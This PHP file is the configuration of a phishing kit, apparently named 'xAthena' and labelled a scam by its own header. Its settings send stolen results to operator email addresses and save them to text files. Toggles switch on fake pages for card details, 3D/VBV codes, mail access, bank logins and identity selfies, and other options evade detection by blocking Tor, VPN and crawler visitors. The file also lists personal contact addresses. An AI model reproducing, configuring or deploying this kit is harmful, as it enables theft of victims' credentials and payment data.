<?php
/*
                /$$$$$$  /$$   /$$ /$$   /$$ /$$      /$$  /$$$$$$  /$$   /$$          
               /$$__  $$| $$  | $$| $$$ | $$| $$$    /$$$ /$$__  $$| $$$ | $$          
 /$$  /$$  /$$| $$  \__/| $$  | $$| $$$$| $$| $$$$  /$$$$| $$  \ $$| $$$$| $$ /$$   /$$
| $$ | $$ | $$|  $$$$$$ | $$  | $$| $$ $$ $$| $$ $$/$$ $$| $$$$$$$$| $$ $$ $$|  $$ /$$/
| $$ | $$ | $$ \____  $$| $$  | $$| $$  $$$$| $$  $$$| $$| $$__  $$| $$  $$$$ \  $$$$/ 
| $$ | $$ | $$ /$$  \ $$| $$  | $$| $$\  $$$| $$\  $ | $$| $$  | $$| $$\  $$$  >$$  $$ 
|  $$$$$/$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$ \/  | $$| $$  | $$| $$ \  $$ /$$/\  $$
 \_____/\___/  \______/  \______/ |__/  \__/|__/     |__/|__/  |__/|__/  \__/|__/  \__/   
 
 SCAM xAthena Edited By xSUNMANx V.1 (2019)
For Any Help Contact Me on Facebook
https://www.facebook.com/rifinha
	*/
	// ================================= //
	// ================================= //
	$redirectlink = "xSUNMANx.today";	 	 // You must use redirect or the scam will not open
	// ================================= //
	// ================================= //
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	$API_KEY = "FUCKED_BY_DNTHIRTEEN_L34KC0DE";
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	// ================================= //
	// ================================= //
	$scamname = "xSUMANx_Fuck_You"; // *Change |xSUNMANx| to any name you want |Your Nick Name|
	// ================================= //
	// ================================= //
	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	$filename = "xSUNMANx"; // Change |stored| to any name you want this will be the Rzlt file name
	// ================================= //
	// ================================= //
	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	$yours = "touayman81@gmail.com,rifinho_10_1@hotmail.com"; 	 // Edit this to your email 
	// ================================= //
	// ================================= //
/////////////////////////////////////////////////////
	$show_captcha ="no"; 				 // If you don`t want to show ||Captcha Page|| edit |yes| to |no| 
        $show_unusual_activity ="yes"; 		 // If you don`t want to show ||Unusual Activity|| edit |yes| to |no|
	$show_3D_VBV ="yes"; 				 // If you don`t want to show ||3D/VBV Page|| edit |yes| to |no| 
	$show_newcard ="yes"; 				 // If you don`t want to show ||Link New Card Page|| edit |yes| to |no|
	$show_mailaccess ="yes"; 			 // If you don`t want to show ||Mail Access Page|| edit |yes| to |no| 
	$show_bank ="yes"; 					 // If you don`t want to show ||Bank Page|| edit |yes| to |no| 
	$show_identity ="yes"; 				 // If you don`t want to show ||Identity/Selfiy|| edit |yes| to |no| 
       $show_process ="yes";                           //If you don`t want to show ||Identity/Selfiy|| edit |yes| to |no| 
/////////////////////////////////////////////////////
	// ================================= //
	// ================================= //
	// ********* IP Protection ********* //
	$ip_protection = "no"; 			     // If you don`t want to use IP Protection change yes to no
	$ip_protection_api = "U2VzZXJpdHlhc0B5YW5kZXguY29t"; // Dont touch :()
	$max_fraud_score = "75";			// Put max fraud score 
	$fuck_tor = "true";					// If you don`t want to disallow Tor Users change true to xAthena
	$fuck_vpn = "xAthena";					// If you don`t want to disallow VPN Users change true to xAthena
	$fuck_crawler = "true";				// If you don`t want to disallow Crawler Users change true to xAthena
	// ================================= //
	// ================================= //
	/////////////////DATE-function//////////////////////
	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}
	/////////////////DATE-function//////////////////////

?>